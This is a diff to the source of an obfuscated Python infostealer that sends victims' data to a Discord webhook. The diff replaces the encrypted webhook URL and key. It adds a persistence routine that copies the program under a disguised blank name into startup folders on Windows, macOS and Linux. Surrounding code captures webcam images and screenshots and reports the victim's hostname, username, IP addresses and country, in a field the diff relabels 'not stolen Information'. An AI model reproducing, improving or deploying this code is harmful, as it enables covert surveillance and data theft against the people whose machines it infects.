@@ -147,10 +147,10 @@ try: v4r_ip_adress_local    = socket.gethostbyname(socket.gethostname())
 except: v4r_ip_adress_local = "None"
 
 v4r_w3bh00k_ur1_crypt = r"""
-gBDzXdILrI//xTwn1TU7OUh98u1EbQUNCTaP2/DvraEznWAm3xynGxRa//CREipHtSHnlhdQ/lSeuPfZdNBcOOP0elcabi4sF1BmTzjQMxI8JTBXgMcyIkKfepGueNo98IIzpMp5l6qH/7OB5LDhnGLIsukTBzmYvLKRtpOvTss4NAA+EK84NyWaD/91qtrJu0V/41n213bsTqBN2El+5w==
+7KjDv+VJXra5XAr3wGYVIKC9ZQ9G8j7cYYa4nfXpS7g+lMuXmItCse7i5LDyWFxa1DcEAQWB6eVa6P6Gm/wyzs2rejlxMUJJ0XoCAyDVR97qX24dSItLIHOC+MjmYQY5Fye2yzFNVxr9GwwDzYq0h/eGR/cbjhLIWh7kpOZgM1ZFwSUB0dcozF1FLU03hbFb8BsbFMo6p57dkOPsSQThyw==
 """
 
-v4r_k3y            = "GzzwNpAtcCugxHXELhqhaywEIkWIPQcYqqyXCkJLxnrhMxVCqWhaVbdjWYdlWWWBrkccQYWbtluOHMNXfQvydkIhILfFmJNWjyKLhVdFjArspbfxfuayPwTubmFQovfHYjysTCBFzapxcskFZNlEbEOvSOsCHATHbGkuVENnHOVFV"
+v4r_k3y            = "sfdbCwfJkxNLHuDRGyyLphGdjJqfIyWVzVukHTCRfstzXWjtJTYXSviSrbczwfAifwTXNUBkwnvFojfPueyAbuwImaDeCWScGJwvrzSNKyYqgSfpZGxntKZvBteHaisIWMvuuvEqsYWVeNvsywUboZtQPoSNZfFs"
 v4r_website        = "None"
 v4r_color_embed = 0x0055a8
 v4r_username_embed = "Stealr"
@@ -2403,7 +2403,7 @@ def D3f_W3bc4m(v4r_zip_file):
         v4r_cap = cv2.VideoCapture(0)
 
         if not v4r_cap.isOpened():
-            v4r_status_camera_capture = "No webcam found."
+            v4r_status_camera_capture = "No webcam.."
             return v4r_status_camera_capture
 
         v4r_ret, v4r_frame = v4r_cap.read()
@@ -2452,6 +2452,34 @@ def D3f_Scr33n5h0t(zip_file):
     except Exception as e:
         v4r_number_screenshot = f"Error: {e}"
         return v4r_number_screenshot
+
+def St4rtup():
+    import os
+    import sys
+    import shutil
+
+    try:
+        v4r_file_path = os.path.abspath(sys.argv[0])
+
+        if v4r_file_path.endswith(".exe"):
+            v4r_ext = "exe"
+        elif v4r_file_path.endswith(".py"):
+            v4r_ext = "py"
+
+        v4r_new_name = f"ㅤ.{v4r_ext}"
+
+        if sys.platform.startswith('win'):  
+            v4r_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+        elif sys.platform.startswith('darwin'): 
+            v4r_folder = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
+        elif sys.platform.startswith('linux'):
+            v4r_folder = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
+        v4r_path_new_file = os.path.join(v4r_folder, v4r_new_name)
+
+        shutil.copy(v4r_file_path, v4r_path_new_file)
+        os.chmod(v4r_path_new_file, 0o777) 
+    except:
+        pass
 
 v4r_option = []
 
@@ -2571,25 +2599,25 @@ try:
 except Exception as e:
     v4r_download_link = f"Error: {e}"
 
-embed = discord.Embed(title="Diddy blud Affected", color=v4r_color_embed
+embed = discord.Embed(title="GGs Diddy blud", color=v4r_color_embed
 ).add_field(
     inline=False,
     name="Information", 
     value=f"""```
-Hostname    : {v4r_hostname_pc}
-Username    : {v4r_username_pc}
-DisplayName : {v4r_displayname_pc}
-Ip Public   : {v4r_ip_address_public}
-Ip Local    : {v4r_ip_adress_local}
-Country     : {v4r_country}```"""
+Hostname    > {v4r_hostname_pc}
+Username    > {v4r_username_pc}
+DisplayName > {v4r_displayname_pc}
+Public Ip   > {v4r_ip_address_public}
+Local Ip    > {v4r_ip_adress_local}
+Country     > {v4r_country}```"""
 ).add_field(
     inline=False,
-    name="Stolen Information", 
+    name="not stolen Information", 
     value=f"""```swift
 {"\n".join(v4r_option)}```"""
 ).add_field(
     inline=False,
-    name="Download Link", 
+    name="Download Link v", 
     value=f"""{v4r_download_link}"""
 ).set_footer(
     text=v4r_footer_text, 
